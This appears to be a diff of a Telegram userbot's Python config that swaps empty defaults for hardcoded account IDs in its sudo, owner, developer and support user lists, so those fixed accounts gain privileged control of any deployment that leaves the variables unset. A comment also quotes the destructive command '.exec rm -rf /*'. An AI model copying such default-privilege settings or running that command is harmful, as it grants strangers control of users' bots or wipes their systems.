@@ -78,12 +78,13 @@ if ENV:
         # specify list of users allowed to use bot
         # WARNING: be careful who you grant access to your bot.
         # malicious users could do ".exec rm -rf /*"
-        SUDO_USERS = os.environ.get("SUDO_USERS", None)
-        WHITELIST_USERS = os.environ.get("WHITELIST_USERS", None)
-        BLACKLIST_USERS = os.environ.get("BLACKLIST_USERS", None)
-        DEVLOPERS = os.environ.get("DEVLOPERS", None)
-        OWNER_ID = os.environ.get("OWNER_ID", None)
-        SUPPORT_USERS = os.environ.get("SUPPORT_USERS", None)
+        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "1097131648").split())
+        WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "832241419").split())
+        BLACKLIST_USERS = set(int(x) for x in os.environ.get("BLACKLIST_USERS", "").split())
+        DEVLOPERS = set(int(x) for x in os.environ.get("DEVLOPERS", "813878981").split())
+        OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "953414679").split())
+        SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "719195224").split())
+        # Very Stream
         VERY_STREAM_LOGIN = os.environ.get("VERY_STREAM_LOGIN", None)
         VERY_STREAM_KEY = os.environ.get("VERY_STREAM_KEY", None)
         GROUP_REG_SED_EX_BOT_S = os.environ.get("GROUP_REG_SED_EX_BOT_S", r"(regex|moku|BananaButler_|rgx|l4mR)bot")
